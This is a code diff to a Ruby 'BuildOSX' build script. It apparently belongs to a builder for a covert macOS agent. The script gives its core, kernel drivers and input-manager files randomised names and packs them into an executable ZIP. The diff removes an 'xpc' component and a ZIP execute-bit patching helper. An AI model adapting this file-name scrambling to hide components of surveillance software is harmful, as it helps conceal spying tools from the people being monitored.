@@ -57,11 +57,10 @@ class BuildOSX < Build
     inputmanager = scramble_name(config, 2)
     driver = scramble_name(config, 4)
     driver64 = scramble_name(config, 16)
-    xpc = scramble_name(config, 8)
     icon = "q45tyh"
         
     @scrambled = {core: core, dir: dir, config: config, inputmanager: inputmanager,
-                  icon: icon, xpc: xpc, driver: driver, driver64: driver64}
+                  icon: icon, driver: driver, driver64: driver64}
 
     # call the super which will actually do the renaming
     # starting from @outputs and @scrambled
@@ -110,7 +109,6 @@ class BuildOSX < Build
                                         path(@scrambled[:driver])+' '+
                                         path(@scrambled[:driver64])+' '+
                                         path(@scrambled[:inputmanager])+' '+
-                                        path(@scrambled[:xpc])+' '+
                                         path(@scrambled[:icon])+' '+
                                         @scrambled[:dir]+' '+
                                         (@demo ? path('demo_image') : 'null') +' '+
@@ -150,30 +148,9 @@ class BuildOSX < Build
       z.file.chmod(0755, @appname)
     end
 
-    # remove this when the correct method has been found
-    #binary_patch_exec_bit('output.zip', @appname)
-
     # this is the only file we need to output after this point
     @outputs = ['output.zip']
 
-  end
-
-
-  def binary_patch_exec_bit(zipfile, filename)
-    content = File.open(path(zipfile), 'rb') {|f| f.read}
-
-    # magic voodoo by Fabio
-    offset = content.rindex(filename) - 46
-    if offset > 0 and content.byteslice(offset, 4) == "\x50\x4b\x01\x02"
-      content[offset + 4] = "\x17"
-      content[offset + 5] = "\x03"    # FS_TYPE_UNIX
-      content[offset + 38] = "\x00"   # extended attributes  0755
-      content[offset + 39] = "\x00"
-      content[offset + 40] = "\xed"
-      content[offset + 41] = "\x81"
-    end
-
-    File.open(path('output.zip'), 'wb') {|f| f.write content}
   end
 
 end
